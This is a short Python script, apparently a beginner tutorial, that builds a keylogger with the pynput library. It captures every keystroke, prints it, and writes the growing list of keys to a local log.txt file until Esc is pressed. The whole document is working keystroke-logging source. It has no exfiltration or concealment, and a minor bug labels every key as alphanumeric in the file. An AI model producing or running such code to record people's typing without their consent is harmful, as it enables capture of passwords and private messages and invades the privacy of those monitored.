#How to use pynput to make a Keylogger
#first install pynput

#Importing Nessary Module
from pynput.keyboard import Key , Listener

#List to store presed key
keys=[]

##Function is called Wgen Key is pressed
def on_press(key):

    #Append the key on key list
    keys.append(key)
    #write the key on file
    write_file(keys)

    try:
        #Check the key is character 
        if hasattr(key,'char'):
            if key.char.isalnum():
                print(f'ALphanumeric key {key} pressed')
            else:
                print(f'SPecial key {key} pressed')
    except AttributeError:
        print(f'SPecial key {key} pressed')
    # print(f'Pressed the {key}')


#Function To write the key in File 
def write_file(keys):
     

     #Open the file pr create the file and write the keys
    with open('log.txt','w') as f:
        for key in keys:
            k= str(key).replace("'","")
            content=str(f'ALphanumeric key {key} pressed\n')
            f.write(content)
            f.write(k+"\n")
        

##Funtion call when the key is released
def on_relese(key):
    #check condition if key esc press then stop the program
    if key == Key.esc:
        return False


#creating the listener object for specific funtion
with Listener(on_press=on_press,on_release=on_relese) as listener:
    listener.join()